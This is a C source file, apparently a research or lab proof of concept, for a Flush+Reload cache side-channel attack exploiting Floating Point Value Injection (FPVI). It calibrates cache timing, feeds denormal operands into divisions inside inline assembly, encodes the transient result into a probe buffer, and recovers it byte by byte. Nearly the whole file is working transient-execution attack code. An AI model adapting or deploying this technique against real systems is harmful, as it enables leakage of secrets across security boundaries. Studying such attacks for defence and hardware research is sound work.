#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>
#include <x86intrin.h>

#include "asm.h"

#define NUM_SAMPLES 10000
#define NUM_ITERATIONS 1000
#define ROUNDS 10


uint64_t measure_access(unsigned char* addr, int is_miss) {
    uint64_t min_time = UINT64_MAX;
    
    for(int i = 0; i < ROUNDS; i++) {
        if(is_miss) {
            clflush(addr);
        } else {
            *(volatile char*)addr; 
        }
        mfence();
        
        uint64_t start = rdtscp();
        *(volatile char*)addr;
        lfence();
        uint64_t end = rdtscp();
        
        uint64_t delta_t = end - start;
        if(delta_t < min_time) {
            min_time = delta_t;
        }
    }
    
    return min_time;
}

uint64_t get_cache_threshold(){
    uint64_t hits = 0;    
    uint64_t misses = 0;   
    uint64_t delta_t;

    unsigned char test_line[64];
    test_line[0] = 1;

    *(volatile char*)test_line;
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t = measure_access(test_line, 0);
        hits += delta_t;
    }

    clflush(test_line);
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t = measure_access(test_line, 1);
        misses += delta_t;
    }

    uint64_t hit_avg = hits / NUM_SAMPLES;
    uint64_t miss_avg = misses / NUM_SAMPLES;
    uint64_t threshold = (miss_avg + hit_avg) / 2;
 
    return threshold;
}

uint64_t get_reload_time(unsigned char *addr) {
    mfence();
    uint64_t start = rdtscp();
    *(volatile char*)addr;
    lfence();
    uint64_t end = rdtscp();
    
    uint64_t delta_t = end - start;
    return delta_t;
}


double make_denormal() {
    uint64_t rand_val;
    asm volatile("rdrand %%rax" : "=a"(rand_val));
    printf("RDRAND generated: 0x%016lx\n", rand_val);
    rand_val &= 0x000FFFFFFFFFFFFFULL;
    printf("After masking: 0x%016lx\n", rand_val);

    return *(double*)&rand_val;
}



int main(int argc, char *argv[]) {
    int CACHE_THRESHOLD = get_cache_threshold();
    int STRIDE = 4096;
    int ITERATIONS = 50;
    int RELOADBUFFER_SIZE = 256 * STRIDE;

    unsigned char *reloadbuffer = aligned_alloc(4096, RELOADBUFFER_SIZE);
    memset(reloadbuffer, 0, RELOADBUFFER_SIZE);
    
    printf("CACHE THRESHOLD = %d cycles\n", CACHE_THRESHOLD);

    double dX = make_denormal();
    double dY = make_denormal();
    
    printf("dX = 0x%016lx\n", *(uint64_t*)&dX);
    printf("dY = 0x%016lx\n", *(uint64_t*)&dY);
    

    uint8_t leaked[8];
    
    for (int byte_index = 0; byte_index < 8; byte_index++) {
        int all_bytes_hit_tracker[256] = {0};

        for (int i = 0; i < ITERATIONS; i++) {
            // 1. Flush
            for (int j = 0; j < 256; j++) {
                clflush(&reloadbuffer[j * STRIDE]);
            }
            mfence();

            // 2. FPVI - TUTTO DENTRO ASSEMBLY!
            int shift = byte_index * 8;
            asm volatile(
                "movsd %[x], %%xmm0\n"
                "movsd %[y], %%xmm1\n"
                "divsd %%xmm1, %%xmm0\n"
                "divsd %%xmm1, %%xmm0\n"
                
                // Estrai byte e accedi cache SUBITO
                "movq %%xmm0, %%rax\n"
                "shr %%cl, %%rax\n"
                "and $0xFF, %%rax\n"
                "shl $12, %%rax\n"
                "add %[buf], %%rax\n"
                "movb (%%rax), %%al\n"
                :
                : [x] "m" (dX), [y] "m" (dY),
                  [buf] "r" (reloadbuffer),
                  "c" (shift)
                : "xmm0", "xmm1", "rax", "memory"
            );

            // 3. Reload
            for(int j = 0; j < 256; j++) {
                uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
                if(reload_time < CACHE_THRESHOLD) {
                    all_bytes_hit_tracker[j]++;
                }
            }
        }

        // Find most hit
        int most_hit_byte = 0;
        int max = 0;
        for(int i = 0; i < 256; i++) {
            if(all_bytes_hit_tracker[i] > max) {
                max = all_bytes_hit_tracker[i];
                most_hit_byte = i;
            }
        }

        leaked[byte_index] = most_hit_byte;
        printf("Byte %d: 0x%02x - %.1f%%\n", byte_index, most_hit_byte, 100.0 * max / ITERATIONS);
    }
    
    printf("\nTransient: 0x");
    for(int i = 7; i >= 0; i--) printf("%02x", leaked[i]);
    printf("\n");

    free(reloadbuffer);
    return 0;
}